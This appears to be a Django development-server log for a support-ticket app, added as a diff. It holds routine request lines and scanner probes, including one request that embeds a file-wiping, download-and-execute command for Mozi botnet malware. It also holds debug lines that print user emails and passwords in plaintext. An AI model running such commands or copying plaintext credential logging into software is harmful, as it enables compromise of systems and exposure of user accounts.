+[22/Nov/2020 18:45:15] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 200 271817
+[22/Nov/2020 18:45:15] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 200 128820
+[22/Nov/2020 18:45:16] "GET /static/admin/img/search.svg HTTP/1.1" 200 458
+[22/Nov/2020 18:45:16] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 200 331
+[22/Nov/2020 18:45:16] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:45:18] "GET /admin/ HTTP/1.1" 200 4600
+[22/Nov/2020 18:45:18] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:45:21] "GET /admin/auth/user/ HTTP/1.1" 200 7019
+[22/Nov/2020 18:45:21] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[22/Nov/2020 18:45:21] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 200 436
+[22/Nov/2020 18:45:21] "GET /static/admin/img/sorting-icons.svg HTTP/1.1" 200 1097
+[22/Nov/2020 18:45:21] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:45:23] "GET /admin/auth/user/2/change/ HTTP/1.1" 200 14756
+[22/Nov/2020 18:45:23] "GET /static/admin/js/SelectFilter2.js HTTP/1.1" 200 12322
+[22/Nov/2020 18:45:23] "GET /static/admin/js/SelectBox.js HTTP/1.1" 200 5753
+[22/Nov/2020 18:45:23] "GET /static/admin/css/forms.css HTTP/1.1" 200 8518
+[22/Nov/2020 18:45:23] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 200 20218
+[22/Nov/2020 18:45:23] "GET /static/admin/js/calendar.js HTTP/1.1" 200 7777
+[22/Nov/2020 18:45:23] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[22/Nov/2020 18:45:23] "GET /static/admin/css/widgets.css HTTP/1.1" 200 10340
+[22/Nov/2020 18:45:23] "GET /static/admin/js/change_form.js HTTP/1.1" 200 712
+[22/Nov/2020 18:45:23] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 200 495
+[22/Nov/2020 18:45:23] "GET /static/admin/img/icon-unknown.svg HTTP/1.1" 200 655
+[22/Nov/2020 18:45:23] "GET /static/admin/img/icon-clock.svg HTTP/1.1" 200 677
+[22/Nov/2020 18:45:23] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 200 1086
+[22/Nov/2020 18:45:23] "GET /static/admin/img/icon-unknown-alt.svg HTTP/1.1" 200 655
+[22/Nov/2020 18:45:23] "GET /static/admin/img/selector-icons.svg HTTP/1.1" 200 3291
+[22/Nov/2020 18:45:23] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:45:38] "GET /admin/ HTTP/1.1" 200 4600
+[22/Nov/2020 18:45:39] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:49:35] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 18:49:36] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 18:49:37] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:49:48] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 18:49:48] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:49:48] "GET /tickets/fetch_ticket/6 HTTP/1.1" 200 400
+[22/Nov/2020 18:49:48] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 18:49:53] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:49:53] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 18:49:55] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 18:49:55] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:49:55] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 18:49:59] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:49:59] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 18:50:02] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:50:02] "GET /accounts/logout/ HTTP/1.1" 200 2
+[22/Nov/2020 18:50:09] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 18:50:09] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:50:09] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 18:52:10] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 18:52:10] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:52:10] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 18:54:15] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:54:15] "GET /accounts/logout/ HTTP/1.1" 200 2
+[22/Nov/2020 18:54:19] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 18:54:19] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:54:19] "GET /tickets/tickets/?format=json HTTP/1.1" 200 373
+[22/Nov/2020 18:56:17] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:56:17] "GET /accounts/logout/ HTTP/1.1" 200 2
+[22/Nov/2020 18:56:30] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 18:56:30] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:56:30] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 18:56:39] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 18:56:39] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 18:56:39] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 18:56:39] "GET /tickets/fetch_ticket/6 HTTP/1.1" 200 400
+[22/Nov/2020 18:58:11] "GET / HTTP/1.1" 200 2613
+Forbidden: /tickets/update_ticket/
+[22/Nov/2020 19:11:43] "POST /tickets/update_ticket/ HTTP/1.1" 403 58
+[22/Nov/2020 19:11:59] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 19:11:59] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 19:25:24] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 19:25:25] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 19:25:25] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 19:26:22] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 19:26:22] "GET /accounts/logout/ HTTP/1.1" 200 2
+[22/Nov/2020 19:26:26] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 19:26:27] "GET /favicon.ico HTTP/1.1" 200 2613
+----------------------------------------
+Exception happened during processing of request from ('49.15.10.240', 31917)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+----------------------------------------
+Exception happened during processing of request from ('49.15.10.240', 40718)
+Traceback (most recent call last):
+  File "/usr/lib/python3.8/socketserver.py", line 650, in process_request_thread
+    self.finish_request(request, client_address)
+  File "/usr/lib/python3.8/socketserver.py", line 360, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+  File "/usr/lib/python3.8/socketserver.py", line 720, in __init__
+    self.handle()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 171, in handle
+    self.handle_one_request()
+  File "/var/www/html/venv/lib/python3.8/site-packages/django/core/servers/basehttp.py", line 179, in handle_one_request
+    self.raw_requestline = self.rfile.readline(65537)
+  File "/usr/lib/python3.8/socket.py", line 669, in readinto
+    return self._sock.recv_into(b)
+ConnectionResetError: [Errno 104] Connection reset by peer
+----------------------------------------
+[22/Nov/2020 19:26:39] "POST /accounts/login/ HTTP/1.1" 200 17
+[22/Nov/2020 19:26:39] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 19:26:39] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 19:26:59] "GET / HTTP/1.1" 200 2612
+[22/Nov/2020 19:27:00] "GET /tickets/tickets/?format=json HTTP/1.1" 200 373
+[22/Nov/2020 19:27:00] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 19:37:33] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 19:37:33] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 19:37:33] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 19:37:33] "GET /tickets/fetch_ticket/10 HTTP/1.1" 200 319
+[22/Nov/2020 19:37:35] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 19:37:35] "GET /tickets/tickets/?format=json HTTP/1.1" 200 1696
+[22/Nov/2020 19:38:08] "GET /favicon.ico HTTP/1.1" 200 2612
+[22/Nov/2020 19:38:08] "GET /tickets/departments/?format=json HTTP/1.1" 200 68
+[22/Nov/2020 19:38:09] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[22/Nov/2020 19:38:09] "GET /tickets/fetch_ticket/5 HTTP/1.1" 200 374
+[22/Nov/2020 20:04:16] "GET /board.cgi?cmd=cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+varcron" 200 2613
+[22/Nov/2020 20:06:57] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 20:10:27] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 21:13:20] "GET / HTTP/1.1" 200 2613
+[22/Nov/2020 21:17:15] "GET / HTTP/1.0" 200 2613
+[22/Nov/2020 21:45:15] "GET /logs HTTP/1.0" 200 2613
+[22/Nov/2020 23:21:49] "GET / HTTP/1.0" 200 2613
+[23/Nov/2020 00:05:07] "GET / HTTP/1.1" 200 2613
+[23/Nov/2020 00:09:06] "GET / HTTP/1.1" 200 2613
+[23/Nov/2020 00:38:30] "GET / HTTP/1.1" 200 2613
+[23/Nov/2020 01:12:59] "GET / HTTP/1.1" 200 2613
+[23/Nov/2020 03:54:38] "GET /favicon.ico HTTP/1.1" 200 2612
+[23/Nov/2020 03:54:38] "GET /accounts/logout/ HTTP/1.1" 200 2
+Unprocessable Entity: /accounts/login/
+[23/Nov/2020 03:54:42] "POST /accounts/login/ HTTP/1.1" 422 45
+[23/Nov/2020 04:00:26] "GET /actuator/health HTTP/1.1" 200 2613
+[23/Nov/2020 04:04:45] "GET / HTTP/1.0" 200 2613
+[23/Nov/2020 04:15:23] "GET / HTTP/1.1" 200 2613
+[23/Nov/2020 04:27:26] "GET / HTTP/1.1" 200 2613
+[23/Nov/2020 04:50:41] "GET / HTTP/1.1" 200 2613
+[23/Nov/2020 05:21:04] "GET /config/getuser?index=0 HTTP/1.1" 200 2613
+[23/Nov/2020 05:31:54] "GET / HTTP/1.1" 200 2613
+Invalid HTTP_HOST header: ''. The domain name provided is not valid according to RFC 1034/1035.
+Bad Request: /manager/html
+[23/Nov/2020 06:44:23] "GET / HTTP/1.1" 200 2613
+[23/Nov/2020 06:44:23] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 304 0
+[23/Nov/2020 06:44:23] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 304 0
+[23/Nov/2020 06:44:23] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:23] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:24] "GET /admin/ HTTP/1.1" 302 0
+[23/Nov/2020 06:44:24] "GET /admin/login/?next=/admin/ HTTP/1.1" 200 1808
+[23/Nov/2020 06:44:24] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[23/Nov/2020 06:44:24] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[23/Nov/2020 06:44:24] "GET /static/admin/css/login.css HTTP/1.1" 304 0
+[23/Nov/2020 06:44:25] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[23/Nov/2020 06:44:26] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[23/Nov/2020 06:44:26] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[23/Nov/2020 06:44:26] "GET /favicon.ico HTTP/1.1" 200 2613
+[23/Nov/2020 06:44:28] "POST /admin/login/?next=/admin/ HTTP/1.1" 302 0
+[23/Nov/2020 06:44:28] "GET /admin/ HTTP/1.1" 200 7474
+[23/Nov/2020 06:44:29] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[23/Nov/2020 06:44:29] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[23/Nov/2020 06:44:29] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[23/Nov/2020 06:44:29] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[23/Nov/2020 06:44:29] "GET /favicon.ico HTTP/1.1" 200 2612
+[23/Nov/2020 06:44:32] "GET /admin/Ticket/department/ HTTP/1.1" 200 4600
+[23/Nov/2020 06:44:32] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[23/Nov/2020 06:44:32] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:32] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:32] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[23/Nov/2020 06:44:32] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:32] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:32] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:32] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:32] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:32] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:32] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[23/Nov/2020 06:44:33] "GET /favicon.ico HTTP/1.1" 200 2612
+[23/Nov/2020 06:44:34] "GET /admin/Ticket/department/2/change/ HTTP/1.1" 200 4197
+[23/Nov/2020 06:44:34] "GET /static/admin/css/forms.css HTTP/1.1" 304 0
+[23/Nov/2020 06:44:34] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:34] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0
+[23/Nov/2020 06:44:34] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[23/Nov/2020 06:44:35] "GET /static/admin/css/widgets.css HTTP/1.1" 304 0
+[23/Nov/2020 06:44:35] "GET /favicon.ico HTTP/1.1" 200 2612
+[23/Nov/2020 09:32:25] "GET / HTTP/1.1" 200 2613
+[23/Nov/2020 10:24:00] "GET / HTTP/1.1" 200 2612
+[23/Nov/2020 10:24:01] "GET /static/css/main.807ab983.chunk.css HTTP/1.1" 304 0
+[23/Nov/2020 10:24:01] "GET /static/js/2.a86bbe9a.chunk.js HTTP/1.1" 304 0
+[23/Nov/2020 10:24:01] "GET /static/css/2.43b2b750.chunk.css HTTP/1.1" 304 0
+[23/Nov/2020 10:24:01] "GET /static/js/main.a13d1d8f.chunk.js HTTP/1.1" 304 0
+[23/Nov/2020 10:24:06] "GET /tickets/tickets HTTP/1.1" 200 2612
+[23/Nov/2020 10:24:06] "GET /tickets/tickets/?format=json HTTP/1.1" 200 352
+[23/Nov/2020 10:24:06] "GET /favicon.ico HTTP/1.1" 200 2612
+[23/Nov/2020 10:24:08] "GET /tickets/tickets/ HTTP/1.1" 200 16733
+[23/Nov/2020 10:24:09] "GET /static/rest_framework/css/bootstrap-tweaks.css HTTP/1.1" 200 3385
+[23/Nov/2020 10:24:09] "GET /static/rest_framework/css/prettify.css HTTP/1.1" 200 817
+[23/Nov/2020 10:24:09] "GET /static/rest_framework/css/default.css HTTP/1.1" 200 1131
+[23/Nov/2020 10:24:09] "GET /static/rest_framework/js/ajax-form.js HTTP/1.1" 200 3597
+[23/Nov/2020 10:24:09] "GET /static/rest_framework/js/csrf.js HTTP/1.1" 200 1719
+[23/Nov/2020 10:24:09] "GET /static/rest_framework/js/bootstrap.min.js HTTP/1.1" 200 39680
+[23/Nov/2020 10:24:10] "GET /static/rest_framework/js/prettify-min.js HTTP/1.1" 200 13632
+[23/Nov/2020 10:24:10] "GET /static/rest_framework/js/default.js HTTP/1.1" 200 1268
+[23/Nov/2020 10:24:10] "GET /static/rest_framework/js/jquery-3.5.1.min.js HTTP/1.1" 200 89476
+[23/Nov/2020 10:24:11] "GET /static/rest_framework/css/bootstrap.min.css HTTP/1.1" 200 121457
+[23/Nov/2020 10:24:11] "GET /static/rest_framework/img/grid.png HTTP/1.1" 200 1458
+[23/Nov/2020 10:24:11] "GET /favicon.ico HTTP/1.1" 200 2612
+[23/Nov/2020 10:25:37] "GET / HTTP/1.1" 200 2613
+[23/Nov/2020 11:42:29] "GET /admin/ HTTP/1.1" 200 7134
+[23/Nov/2020 11:42:29] "GET /static/admin/css/dashboard.css HTTP/1.1" 304 0
+[23/Nov/2020 11:42:29] "GET /static/admin/css/responsive.css HTTP/1.1" 304 0
+[23/Nov/2020 11:42:29] "GET /static/admin/css/base.css HTTP/1.1" 304 0
+[23/Nov/2020 11:42:29] "GET /static/admin/css/fonts.css HTTP/1.1" 304 0
+[23/Nov/2020 11:42:30] "GET /static/admin/img/icon-deletelink.svg HTTP/1.1" 200 392
+[23/Nov/2020 11:42:30] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 304 0
+[23/Nov/2020 11:42:30] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 304 0
+[23/Nov/2020 11:42:30] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 304 0
+[23/Nov/2020 11:42:30] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 304 0
+[23/Nov/2020 11:42:30] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 304 0
+[23/Nov/2020 11:42:30] "GET /favicon.ico HTTP/1.1" 200 2612
+[23/Nov/2020 11:42:34] "GET /admin/Ticket/ticket/ HTTP/1.1" 200 4537
+[23/Nov/2020 11:42:34] "GET /static/admin/js/jquery.init.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:34] "GET /static/admin/js/admin/RelatedObjectLookups.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:34] "GET /static/admin/css/changelists.css HTTP/1.1" 304 0
+[23/Nov/2020 11:42:34] "GET /static/admin/js/vendor/jquery/jquery.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:34] "GET /static/admin/js/core.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:34] "GET /static/admin/js/actions.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:34] "GET /static/admin/js/urlify.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:34] "GET /static/admin/js/prepopulate.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:34] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[23/Nov/2020 11:42:34] "GET /static/admin/js/vendor/xregexp/xregexp.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:35] "GET /static/admin/img/tooltag-add.svg HTTP/1.1" 304 0
+[23/Nov/2020 11:42:35] "GET /favicon.ico HTTP/1.1" 200 2612
+[23/Nov/2020 11:42:37] "GET /admin/Ticket/ HTTP/1.1" 200 3322
+[23/Nov/2020 11:42:38] "GET /favicon.ico HTTP/1.1" 200 2612
+[23/Nov/2020 11:42:39] "GET /admin/ HTTP/1.1" 200 7134
+[23/Nov/2020 11:42:39] "GET /favicon.ico HTTP/1.1" 200 2612
+[23/Nov/2020 11:42:40] "GET /admin/auth/user/ HTTP/1.1" 200 7020
+[23/Nov/2020 11:42:40] "GET /static/admin/img/search.svg HTTP/1.1" 304 0
+[23/Nov/2020 11:42:40] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[23/Nov/2020 11:42:40] "GET /static/admin/img/icon-yes.svg HTTP/1.1" 304 0
+[23/Nov/2020 11:42:40] "GET /static/admin/img/sorting-icons.svg HTTP/1.1" 304 0
+[23/Nov/2020 11:42:41] "GET /favicon.ico HTTP/1.1" 200 2612
+[23/Nov/2020 11:42:41] "GET /admin/auth/user/2/change/ HTTP/1.1" 200 14757
+[23/Nov/2020 11:42:42] "GET /static/admin/css/forms.css HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /static/admin/js/admin/DateTimeShortcuts.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /static/admin/js/calendar.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /admin/jsi18n/ HTTP/1.1" 200 3223
+[23/Nov/2020 11:42:42] "GET /static/admin/js/SelectFilter2.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /static/admin/js/SelectBox.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /static/admin/js/change_form.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /static/admin/js/prepopulate_init.js HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /static/admin/css/widgets.css HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /static/admin/img/icon-unknown-alt.svg HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /static/admin/img/icon-unknown.svg HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /static/admin/img/icon-calendar.svg HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /static/admin/img/selector-icons.svg HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /static/admin/img/icon-clock.svg HTTP/1.1" 304 0
+[23/Nov/2020 11:42:42] "GET /favicon.ico HTTP/1.1" 200 2612
+/var/www/html/PeerXP_React/PeerXP_React/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 22, 2020 - 18:37:40
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+b'email=john%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'john@gmail.com'), ('password', '19661999')]
+b'email=john%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'john@gmail.com'), ('password', '19661999')]
+b'email=diana%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '19661999')]
+b'email=john%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'john@gmail.com'), ('password', '19661999')]
+b'email=diana%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '19661999')]
+b'email=diana%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '19661999')]
+b'email=diana%40gmail.com&password=196619'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '196619')]
+Watching for file changes with StatReloader
+/var/www/html/PeerXP_React/PeerXP_React/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 23, 2020 - 12:46:17
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+Invalid HTTP_HOST header: '13.233.215.193:8080'. You may need to add '13.233.215.193' to ALLOWED_HOSTS.
+Bad Request: /
+[23/Nov/2020 12:46:38] "GET / HTTP/1.1" 400 63410
+Invalid HTTP_HOST header: '13.233.215.193:8080'. You may need to add '13.233.215.193' to ALLOWED_HOSTS.
+Bad Request: /favicon.ico
+[23/Nov/2020 12:46:39] "GET /favicon.ico HTTP/1.1" 400 63454
+/var/www/html/PeerXP_React/PeerXP_React/settings.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 23, 2020 - 12:46:20
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+Watching for file changes with StatReloader
+[23/Nov/2020 12:47:20] "GET / HTTP/1.1" 200 2713
+[23/Nov/2020 12:47:20] "GET /static/js/main.232298e5.chunk.js HTTP/1.1" 200 19449
+[23/Nov/2020 12:47:21] "GET /static/js/2.e7c0fc50.chunk.js HTTP/1.1" 200 304030
+[23/Nov/2020 12:47:22] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:47:23] "GET /tickets/all_tickets/ HTTP/1.1" 200 3830
+[23/Nov/2020 12:47:28] "GET /accounts/logout/ HTTP/1.1" 200 2
+[23/Nov/2020 12:47:28] "GET /favicon.ico HTTP/1.1" 200 2641
+[23/Nov/2020 12:47:31] "POST /accounts/login/ HTTP/1.1" 200 17
+[23/Nov/2020 12:47:31] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:47:32] "GET /tickets/all_tickets/ HTTP/1.1" 200 3830
+[23/Nov/2020 12:47:33] "GET /accounts/logout/ HTTP/1.1" 200 2
+[23/Nov/2020 12:47:33] "GET /favicon.ico HTTP/1.1" 200 2713
+Unprocessable Entity: /accounts/login/
+[23/Nov/2020 12:47:36] "POST /accounts/login/ HTTP/1.1" 422 45
+[23/Nov/2020 12:47:43] "POST /accounts/login/ HTTP/1.1" 200 17
+[23/Nov/2020 12:47:44] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:47:44] "GET /tickets/all_tickets/ HTTP/1.1" 200 3830
+[23/Nov/2020 12:47:48] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:47:48] "GET /tickets/departments/?format=json HTTP/1.1" 200 98
+[23/Nov/2020 12:47:49] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+[23/Nov/2020 12:47:49] "GET /tickets/fetch_ticket/7189000003044077 HTTP/1.1" 200 455
+[23/Nov/2020 12:48:01] "GET /favicon.ico HTTP/1.1" 200 2713
+[23/Nov/2020 12:48:01] "GET /tickets/departments/?format=json HTTP/1.1" 200 98
+[23/Nov/2020 12:48:02] "GET /tickets/categories/?format=json HTTP/1.1" 200 644
+Forbidden: /tickets/add_ticket/
+[23/Nov/2020 12:48:07] "POST /tickets/add_ticket/ HTTP/1.1" 403 58
+Forbidden: /tickets/add_ticket/
+[23/Nov/2020 12:48:12] "POST /tickets/add_ticket/ HTTP/1.1" 403 58
+[23/Nov/2020 12:48:18] "GET /manifest.json HTTP/1.1" 200 2641
+[23/Nov/2020 12:48:18] "GET /static/js/main.232298e5.chunk.js.map HTTP/1.1" 200 38076
+[23/Nov/2020 12:48:22] "GET /static/css/main.807ab983.chunk.css.map HTTP/1.1" 200 2735
+[23/Nov/2020 12:48:22] "GET /static/js/main.232298e5.chunk.js.map HTTP/1.1" 200 38076
+[23/Nov/2020 12:48:26] "GET /static/css/2.43b2b750.chunk.css.map HTTP/1.1" 200 487958
+/var/www/html/PeerXP_React/Ticket/views.py changed, reloading.
+Performing system checks...
+
+System check identified no issues (0 silenced).
+November 23, 2020 - 12:46:59
+Django version 2.2.8, using settings 'PeerXP_React.settings'
+Starting development server at http://0.0.0.0:8080/
+Quit the server with CONTROL-C.
+b'email=diana%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '19661999')]
+b'email=diana%40gmail.com&password=19661999+vfgdfgdf'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '19661999 vfgdfgdf')]
+b'email=diana%40gmail.com&password=19661999'
+LOGIN DATA >>  [('email', 'diana@gmail.com'), ('password', '19661999')]
+{'modifiedTime': '2020-11-23T12:41:14.000Z', 'subCategory': None, 'statusType': 'Open', 'subject': 'Ticket Created by Burhanuddin Abbas', 'dueDate': None, 'departmentId': '7189000000051431', 'channel': 'Phone', 'onholdTime': None, 'language': 'English', 'source': {'appName': None, 'extId': None, 'permalink': None, 'type': 'SYSTEM', 'appPhotoURL': None}, 'resolution': None, 'sharedDepartments': [], 'closedTime': None, 'approvalCount': '0', 'isTrashed': False, 'createdTime': '2020-11-23T12:41:14.000Z', 'id': '7189000003044077', 'isResponseOverdue': False, 'customerResponseTime': '2020-11-23T12:41:14.000Z', 'productId': None, 'contactId': '7189000000125039', 'threadCount': '0', 'secondaryContacts': [], 'priority': 'HIGH - Production System Down', 'classification': None, 'commentCount': '0', 'taskCount': '0', 'accountId': '7189000000107157', 'phone': None, 'webUrl': 'https://support.peerxp.com/support/peerxp/ShowHomePage.do#Cases/dv/7189000003044077', 'isSpam': False, 'status': 'Open', 'ticketNumber': '1294', 'sentiment': None, 'customFields': {'Type': None, 'PWSLab Project 